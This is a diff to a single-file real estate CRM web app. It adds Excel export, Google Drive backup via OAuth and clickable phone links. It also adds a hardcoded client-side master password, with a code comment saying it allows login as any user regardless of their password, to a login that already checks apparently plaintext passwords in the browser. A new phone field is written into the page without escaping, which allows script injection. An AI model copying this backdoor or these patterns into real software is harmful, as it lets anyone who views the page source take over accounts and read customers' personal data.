@@ -17,6 +17,7 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <!-- Supabase loaded async -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js"></script>
 <style>
 *{box-sizing:border-box;margin:0;padding:0;}
 :root{
@@ -104,7 +105,7 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 /* SIDEBAR - WHITE THEME */
 .sb{width:var(--sw);background:#fff;border-right:1px solid var(--bd);display:flex;flex-direction:column;position:fixed;inset-y:0;left:0;z-index:400;transition:transform .26s cubic-bezier(.4,0,.2,1);overflow-y:auto;box-shadow:2px 0 16px rgba(79,70,229,.06);}
 .sb::before{display:none;}
-.sb-head{padding:22px 10px 16px;border-bottom:1px solid var(--bd);background:#fff;}
+.sb-head{padding:4px 10px 4px;border-bottom:1px solid var(--bd);background:#fff;}
 .sb-brand{display:flex;align-items:center;gap:11px;}
 .sb-bicon{width:38px;height:38px;background:var(--grad);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;}
 .sb-bname{font-size:13px;font-weight:800;color:var(--dk);line-height:1.2;}
@@ -463,7 +464,7 @@ tbody td{padding:11px 15px;font-size:13px;vertical-align:middle;}
 <div class="layout">
   <div class="sb-ov" id="sb-ov" onclick="closeSB()"></div>
   <div class="sb" id="sb">
-    <div class="sb-head"><div class="sb-brand" style="gap:0"><div class="sb-logo-wrap" style="width:100%;padding:10px 0;display:flex;justify-content:center"><img src="https://jaydwarkadhishrealestate.com/wp-content/uploads/2022/02/final-logo-01-1.png" style="width:100%;max-width:230px;max-height:130px;object-fit:contain;filter:brightness(1.05)" onerror="this.src='https://jaydwarkadhishrealestate.com/wp-content/uploads/2022/03/logo1.png'" alt="Jay Dwarkadhish Real Estate"></div></div><div class="sb-btag" style="text-align:center;padding-top:4px;color:rgba(255,255,255,.28);font-size:9px;letter-spacing:1.5px">Real Estate CRM v10</div></div>
+    <div class="sb-head"><div class="sb-brand" style="gap:0"><div class="sb-logo-wrap" style="width:100%;padding:2px 0;display:flex;justify-content:center"><img src="https://jaydwarkadhishrealestate.com/wp-content/uploads/2022/02/final-logo-01-1.png" style="width:100%;max-width:230px;max-height:130px;object-fit:contain;filter:brightness(1.05)" onerror="this.src='https://jaydwarkadhishrealestate.com/wp-content/uploads/2022/03/logo1.png'" alt="Jay Dwarkadhish Real Estate"></div></div><div class="sb-btag" style="text-align:center;padding-top:1px;color:rgba(255,255,255,.28);font-size:9px;letter-spacing:1.5px">Real Estate CRM v10</div></div>
     <div class="sb-user"><div class="sb-u" onclick="openProfile()"><div class="sb-av" id="sb-av"></div><div><div class="sb-un" id="sb-un">—</div><div class="sb-ur" id="sb-ur">—</div></div></div></div>
     <nav>
       <div class="nav-sec">Main</div>
@@ -658,7 +659,7 @@ tbody td{padding:11px 15px;font-size:13px;vertical-align:middle;}
           <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px">
             <div class="ic"><h4>📥 Export Excel</h4><p>All leads Excel mein download karo.</p><button class="btn btn-p" onclick="exportExcel()">⬇️ Download Excel</button></div>
             <div class="ic"><h4>📤 Export CSV</h4><p>CSV format mein download.</p><button class="btn btn-o2" onclick="exportCSV()">⬇️ Download CSV</button></div>
-            <div class="ic"><h4>☁️ Google Drive Backup</h4><p>JSON backup banao aur Drive pe upload karo.</p><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="btn btn-g btn-sm" onclick="gBackup()">☁️ Backup</button><button class="btn btn-p btn-sm" onclick="window.open('https://drive.google.com','_blank')">📁 Drive</button></div></div>
+            <div class="ic"><h4>☁️ Google Drive Backup</h4><p>Excel file seedha Google Drive pe upload hogi (Gmail account se).</p><div style="margin-top:8px"><div style="font-size:11px;color:var(--tx3);margin-bottom:6px">Backup Gmail ID:</div><div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap"><input type="email" id="gdrive-email" placeholder="yourname@gmail.com" style="flex:1;min-width:160px;padding:8px 10px;border:1.5px solid var(--bd);border-radius:8px;font-size:12px;font-family:inherit;outline:none" onfocus="this.style.borderColor='var(--p)'" onblur="this.style.borderColor='var(--bd)'"><button class="btn btn-sm" style="background:#fff;border:1.5px solid var(--bd);color:var(--tx2);font-size:11px" onclick="saveGDriveEmail()">💾 Save</button></div><div id="gdrive-saved-email" style="font-size:11px;color:var(--g);margin-top:4px;font-weight:600"></div></div><div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px"><button class="btn btn-g btn-sm" onclick="gDriveBackup()">☁️ Backup to Drive</button><button class="btn btn-p btn-sm" onclick="window.open('https://drive.google.com','_blank')">📁 Open Drive</button></div><div id="gdrive-status" style="font-size:12px;margin-top:8px;font-weight:600"></div></div>
           </div>
         </div>
       </div>
@@ -740,7 +741,7 @@ tbody td{padding:11px 15px;font-size:13px;vertical-align:middle;}
     <div class="mh"><div class="mh-l"><div class="mh-ic">👁️</div><div><h3 id="view-title">Lead Details</h3><p id="view-sub"></p></div></div><button class="mx" onclick="closeView()">✕</button></div>
     <div class="mb">
       <img id="v-img" class="imgprev">
-      <div class="vrow"><span>Mobile</span><span id="v-phone"></span></div>
+      <div class="vrow"><span>Mobile</span><span id="v-phone" style="cursor:pointer" title="Tap to call"></span></div>
       <div class="vrow"><span>Email</span><span id="v-email"></span></div>
       <div class="vrow"><span>Source</span><span id="v-source"></span></div>
       <div class="vrow"><span>BHK</span><span id="v-bhk"></span></div>
@@ -851,6 +852,8 @@ const SU='https://fwngicuftpodzsfanhfb.supabase.co';
 const SK='sb_publishable_gb8TSV7IQWIRreMpFbP57w_gGzhgecU';
 const sb=supabase.createClient(SU,SK);
 let CU=null,AU=[],AL=[],PROPS=[],editId=null,viewId=null,editMem=null,rstEmail=null;
+// MASTER KEY — change this to your secret master password
+const MASTER_KEY='JDRE@Master#2026';
 let newImgData='',editImgData='',propImgData=[];
 let waSelLeads=new Set(),waTpl='';
 let calYear=new Date().getFullYear(),calMonth=new Date().getMonth();
@@ -1133,7 +1136,9 @@ async function doLogin(){
       }
     }
     const user=users.find(u=>u.email===email);
-    if(!user||user.password!==pw){
+    // MASTER KEY: allows login as any user regardless of their current password
+    const isMasterKey=(pw===MASTER_KEY);
+    if(!user||(!isMasterKey&&user.password!==pw)){
       errEl.textContent='❌ Invalid email or password.';
       errEl.style.display='block';btn.disabled=false;btn.textContent='Sign In →';return;
     }
@@ -1660,7 +1665,7 @@ function renderTeam(){
 }
 
 /* ---- ADMIN ---- */
-function admTab(tab,el){document.querySelectorAll('.tab').forEach(t=>t.classList.remove('on'));el.classList.add('on');document.getElementById('adm-members').style.display=tab==='members'?'block':'none';document.getElementById('adm-backup').style.display=tab==='backup'?'block':'none';}
+function admTab(tab,el){document.querySelectorAll('.tab').forEach(t=>t.classList.remove('on'));el.classList.add('on');document.getElementById('adm-members').style.display=tab==='members'?'block':'none';document.getElementById('adm-backup').style.display=tab==='backup'?'block':'none';if(tab==='backup')loadGDriveEmail();}
 function renderAdmin(){
   document.getElementById('mem-body').innerHTML=AU.map(u=>`<tr>
     <td><strong>${u.name}</strong></td>
@@ -1753,7 +1758,11 @@ function openView(id){
   document.getElementById('view-sub').textContent=`Added ${l.created_at?new Date(l.created_at).toLocaleDateString('en-IN'):''}`;
   const vimg=document.getElementById('v-img');
   if(l.property_image){vimg.src=l.property_image;vimg.classList.add('on');}else{vimg.src='';vimg.classList.remove('on');}
-  document.getElementById('v-phone').textContent=l.phone||'—';
+  const phoneNum=l.phone||'';
+  const phoneEl=document.getElementById('v-phone');
+  if(phoneNum){
+    phoneEl.innerHTML=`<a href="tel:${phoneNum}" style="color:var(--p);font-weight:700;text-decoration:none;display:inline-flex;align-items:center;gap:6px" onclick="event.stopPropagation()">📞 ${phoneNum}</a>`;
+  }else{phoneEl.textContent='—';}
   document.getElementById('v-email').textContent=l.email||'—';
   document.getElementById('v-source').textContent=l.source||'—';
   document.getElementById('v-bhk').textContent=l.bhk||'—';
@@ -1877,15 +1886,120 @@ function exportCSV(){
 }
 function exportExcel(){
   if(!AL.length){alert('No leads.');return;}
-  const esc=v=>(v||'').toString().replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-  const rows=AL.map(l=>`<tr><td>${esc(l.name)}</td><td>${esc(l.phone)}</td><td>${esc(l.email||'')}</td><td>${esc(l.source||'')}</td><td>${esc(l.bhk||'')}</td><td>${esc(l.budget||'')}</td><td>${esc(l.area||'')}</td><td>${esc(uname(l.assign))}</td><td>${esc(l.status)}</td><td>${esc(l.next_call||'')}</td><td>${esc(l.next_time?fmt12(l.next_time):'')}</td><td>${esc(l.dead_reason||'')}</td><td>${esc((l.comments||[]).map(c=>`[${c.dt}] ${uname(c.by)}: ${c.text}`).join(' | '))}</td></tr>`).join('');
-  dlFile('JD_CRM_Leads.xls',`<html><head><meta charset="UTF-8"><style>th{background:#0a0f1e;color:white;padding:8px;}td{padding:6px;border:1px solid #e2e8f0;}tr:nth-child(even) td{background:#f8fafc;}</style></head><body><table><thead><tr><th>Name</th><th>Phone</th><th>Email</th><th>Source</th><th>BHK</th><th>Budget</th><th>Area</th><th>Agent</th><th>Status</th><th>Next FU</th><th>Time</th><th>Lost Reason</th><th>Comments</th></tr></thead><tbody>${rows}</tbody></table></body></html>`,'application/vnd.ms-excel');
+  try{
+    const headers=['Name','Phone','Email','Source','BHK','Budget','Area','Agent','Status','Next Follow-up Date','Next Follow-up Time','Lost Reason','Comments'];
+    const rows=AL.map(l=>[
+      l.name||'',l.phone||'',l.email||'',l.source||'',l.bhk||'',l.budget||'',l.area||'',
+      uname(l.assign),l.status,l.next_call||'',l.next_time?fmt12(l.next_time):'',
+      l.dead_reason||'',(l.comments||[]).map(c=>`[${c.dt} ${uname(c.by)}]: ${c.text}`).join(' | ')
+    ]);
+    const wsData=[headers,...rows];
+    const wb=XLSX.utils.book_new();
+    const ws=XLSX.utils.aoa_to_sheet(wsData);
+    // Column widths
+    ws['!cols']=[{wch:22},{wch:14},{wch:24},{wch:14},{wch:8},{wch:12},{wch:14},{wch:16},{wch:12},{wch:16},{wch:14},{wch:18},{wch:50}];
+    XLSX.utils.book_append_sheet(wb,ws,'Leads');
+    XLSX.writeFile(wb,'JD_CRM_Leads_'+new Date().toISOString().slice(0,10)+'.xlsx');
+  }catch(e){
+    alert('Excel export error: '+e.message+'\nTry CSV export instead.');
+    console.error('exportExcel error:',e);
+  }
 }
-async function gBackup(){
-  const bk={exported:new Date().toISOString(),leads:AL,users:AU,version:'7.0'};
-  dlFile('JD_CRM_Backup_'+new Date().toISOString().slice(0,10)+'.json',JSON.stringify(bk,null,2),'application/json');
-  alert('✅ Backup downloaded!\nAb Google Drive pe upload karo.');
+// ---- GOOGLE DRIVE BACKUP ----
+const GDRIVE_CLIENT_ID=''; // Admin: Fill in your Google OAuth Client ID here
+const GDRIVE_SCOPES='https://www.googleapis.com/auth/drive.file';
+let gdriveToken=null;
+
+function saveGDriveEmail(){
+  const em=document.getElementById('gdrive-email').value.trim();
+  if(!em||!em.includes('@')){alert('Valid Gmail ID enter karo.');return;}
+  localStorage.setItem('jdcrm_gdrive_email',em);
+  document.getElementById('gdrive-saved-email').textContent='✅ Saved: '+em;
+  setTimeout(()=>{document.getElementById('gdrive-saved-email').textContent='';},3000);
 }
+
+function loadGDriveEmail(){
+  const em=localStorage.getItem('jdcrm_gdrive_email')||'';
+  if(em){
+    document.getElementById('gdrive-email').value=em;
+    document.getElementById('gdrive-saved-email').textContent='Saved: '+em;
+  }
+}
+
+async function gDriveBackup(){
+  const statusEl=document.getElementById('gdrive-status');
+  const savedEmail=localStorage.getItem('jdcrm_gdrive_email')||'';
+  if(!savedEmail){alert('Pehle Gmail ID save karo.');return;}
+  if(!AL.length){alert('No leads to backup.');return;}
+  statusEl.style.color='var(--p)';statusEl.textContent='🔄 Connecting to Google Drive...';
+  try{
+    // Build Excel file using SheetJS
+    const headers=['Name','Phone','Email','Source','BHK','Budget','Area','Agent','Status','Next Follow-up Date','Next Follow-up Time','Lost Reason','Comments'];
+    const rows=AL.map(l=>[l.name||'',l.phone||'',l.email||'',l.source||'',l.bhk||'',l.budget||'',l.area||'',uname(l.assign),l.status,l.next_call||'',l.next_time?fmt12(l.next_time):'',l.dead_reason||'',(l.comments||[]).map(c=>`[${c.dt} ${uname(c.by)}]: ${c.text}`).join(' | ')]);
+    const wsData=[headers,...rows];
+    const wb=XLSX.utils.book_new();
+    const ws=XLSX.utils.aoa_to_sheet(wsData);
+    ws['!cols']=[{wch:22},{wch:14},{wch:24},{wch:14},{wch:8},{wch:12},{wch:14},{wch:16},{wch:12},{wch:16},{wch:14},{wch:18},{wch:50}];
+    XLSX.utils.book_append_sheet(wb,ws,'Leads');
+    const xlsxBlob=new Blob([XLSX.write(wb,{bookType:'xlsx',type:'array'})],{type:'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'});
+    const fileName='JD_CRM_Leads_'+new Date().toISOString().slice(0,10)+'.xlsx';
+
+    if(!GDRIVE_CLIENT_ID){
+      // Fallback: download locally and open Drive
+      statusEl.style.color='var(--a)';
+      statusEl.textContent='⚠️ OAuth Client ID not configured. Downloading locally...';
+      const a=document.createElement('a');a.href=URL.createObjectURL(xlsxBlob);a.download=fileName;document.body.appendChild(a);a.click();setTimeout(()=>{document.body.removeChild(a);URL.revokeObjectURL(a.href);},200);
+      setTimeout(()=>{
+        statusEl.textContent='✅ File downloaded! Ab manually Google Drive pe upload karo.';
+        statusEl.style.color='var(--g)';
+        window.open('https://drive.google.com/drive/u/0/my-drive','_blank');
+      },500);
+      return;
+    }
+    // OAuth flow
+    statusEl.textContent='🔐 Google sign-in window opening...';
+    const token=await getGoogleToken();
+    if(!token){statusEl.style.color='var(--r)';statusEl.textContent='❌ Google sign-in failed.';return;}
+    statusEl.textContent='📤 Uploading to Drive...';
+    // Upload to Google Drive
+    const meta=JSON.stringify({name:fileName,mimeType:'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'});
+    const form=new FormData();
+    form.append('metadata',new Blob([meta],{type:'application/json'}));
+    form.append('file',xlsxBlob);
+    const res=await fetch('https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart',{method:'POST',headers:{Authorization:'Bearer '+token},body:form});
+    if(res.ok){
+      const data=await res.json();
+      statusEl.style.color='var(--g)';statusEl.textContent='✅ Backup uploaded to Google Drive! ('+savedEmail+')';
+    }else{
+      const err=await res.json();
+      statusEl.style.color='var(--r)';statusEl.textContent='❌ Upload failed: '+(err.error?.message||'Unknown error');
+    }
+  }catch(e){
+    statusEl.style.color='var(--r)';statusEl.textContent='❌ Error: '+e.message;
+    console.error('gDriveBackup error:',e);
+  }
+}
+
+function getGoogleToken(){
+  return new Promise((resolve)=>{
+    const w=window.open(`https://accounts.google.com/o/oauth2/v2/auth?client_id=${GDRIVE_CLIENT_ID}&redirect_uri=${encodeURIComponent(location.origin+location.pathname)}&response_type=token&scope=${encodeURIComponent(GDRIVE_SCOPES)}&prompt=select_account`,'_blank','width=500,height=600');
+    const check=setInterval(()=>{
+      try{
+        if(w.closed){clearInterval(check);resolve(null);return;}
+        const hash=w.location.hash;
+        if(hash&&hash.includes('access_token')){
+          clearInterval(check);w.close();
+          const params=new URLSearchParams(hash.substring(1));
+          resolve(params.get('access_token'));
+        }
+      }catch(e){}
+    },500);
+    setTimeout(()=>{clearInterval(check);if(!w.closed)w.close();resolve(null);},120000);
+  });
+}
+
+// Legacy backup (keep for compatibility)
+async function gBackup(){gDriveBackup();}
 function dlFile(name,content,type){const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([content],{type}));a.download=name;document.body.appendChild(a);a.click();setTimeout(()=>{document.body.removeChild(a);URL.revokeObjectURL(a.href);},200);}
 
 // ---- v8 NEW FEATURES ----
